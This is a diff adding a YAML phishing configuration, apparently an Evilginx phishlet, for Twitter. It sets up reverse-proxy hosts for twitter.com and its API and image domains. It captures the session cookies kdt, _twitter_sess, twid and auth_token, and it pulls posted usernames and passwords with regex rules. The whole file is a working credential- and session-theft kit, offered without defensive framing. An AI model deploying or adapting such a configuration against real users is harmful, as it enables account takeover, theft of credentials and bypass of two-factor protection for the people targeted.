@@ -1,0 +1,27 @@
+author: '@white_fi'
+min_ver: '3.0.0'
+redirect_url: 'https://twitter.com/home'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.twitter.com'
+    keys: ['kdt:always','_twitter_sess:always','twid:always','auth_token:always']
+    type: 'cookie'
+auth_urls:
+  - '/home'
+  - '/i/flow/login'
+credentials:
+  username:
+    key: 'session\[username_or_email\]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session\[password\]'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'twitter.com'
+  path: '/login'
